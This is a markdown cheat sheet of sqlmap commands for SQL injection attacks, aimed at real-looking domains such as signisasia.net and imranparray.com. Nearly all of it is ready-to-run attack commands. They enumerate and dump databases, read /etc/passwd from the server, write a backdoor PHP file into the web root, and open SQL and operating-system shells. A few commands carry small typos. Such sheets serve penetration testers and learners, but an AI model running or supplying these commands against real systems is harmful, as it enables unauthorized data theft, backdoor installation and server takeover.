# SqlMap Quick CheatSheet


__URL WRITING__

__Single URL__
```console
sqlmap -u http://signisasia.net/books/view?id=1 --dbs
```

__Input Request in File__

- Capture the request with httpheader,burpsuite
- Save it to req.txt
```console
sqlmap -r request.txt
```


__Input Request in File(Test only username parameter)__

- Capture the request with httpheader,burpsuite
- Save it to req.txt
```console
sqlmap -r req.txt -p username
```


__Testing a pattern of URL's__

- If we have test for a URL scheme injection like 

```console
http://signisasia.net/books/1/view
http://signisasia.net/books/2/view
http://signisasia.net/books/3/view
```

- The following URL's can be used to test all the URL's

```console
sqlmap -u http://signisasia.net/books/*/view --dbs
```

__[Post injection Direcltly]__
```console
sqlmap -u http://imranparray.com/login.php --data "username=imx&pass=imx100&submit=Submit" -p username

> --data is the post data send in the request
> -p is the injection point.
```




__Using Cookies__
```console
sqlmap -u http://imranparray.com/welcom.php --cookie="PHPSESSID=adsaasd56454a6s54d54" -u http://imranparray.com/welcome/functionality.php?id=100
```


__Scanning multiple targets__

```console
sqlmap -m urls.txt -dbs --batch'

```

## Exploitation


__Extract Databases__
```console
sqlmap -u http://signisasia.net/becomemember.php?id=14 --dbs 	
```
__Extract Tables from database__
```console
sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database --tables
```

__Extract Columns of table_name from database__
```console
sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database -T table_name --columns
```

__Dumping Data__
```console
sqlmap -u http://signisasia.net/becomemember.php?id=14 -D database -T table_name -C colum1,column2,clumn3 --dump
```





## Speeding Up The process

__Multithreading__
```console
sqlmap -u http://signisasia.net/books/view.php?id=100 --dbs --threads 5
```


__Null-Connection__

```console
sqlmap -u http://signisasia.net/books/view.php?id=100 --dbs --null-connection
```

__HTTP Persistant Connection__

```console
sqlmap -u http://signisasia.net/books/view.php?id=100 --dbs --keep-alive
```

__Output prediction__

```console
sqlmap -u http://signisasia.net/books/view.php?id=100 -D database -T user -c users,password --dump --predict-output
```



## File Privileges

__[Checking privilages]__

```console
sqlmap -u http://signisasia.net/books/view.php?id=100 --privileges
```

__Reading Files from the server__
```console
sqlmap -u http://signisasia.net/books/view.php?id=100 --file-read=/etc/passwd
```

__Uploading Files/Shell__
```console
sqlmap -u http://signisasia.net/books/view.php?id=100 --file-write=/root/imxx/backdoor.php --file-dest=/var/www/imran.php
```








## Getting Shells


__Sql Shell__

```console
sqlmap -u http://imranparray.com/login.php?id=100 --sql-shell
```

__OS shell__
```console
sqlmap -u http://imranparray.com/login.php?id=100 --os-shell
```

__Os Command Exe without Shell Upload__
```console
sqlmap -u http://imranparray.com/login.php?id=100 --os-cmd "uname -a"
```

__Using Proxy__
```console
sqlmap --proxy="127.0.0.1:8888" -u https://imranparray.com/home.php?id=12 --dbs
```
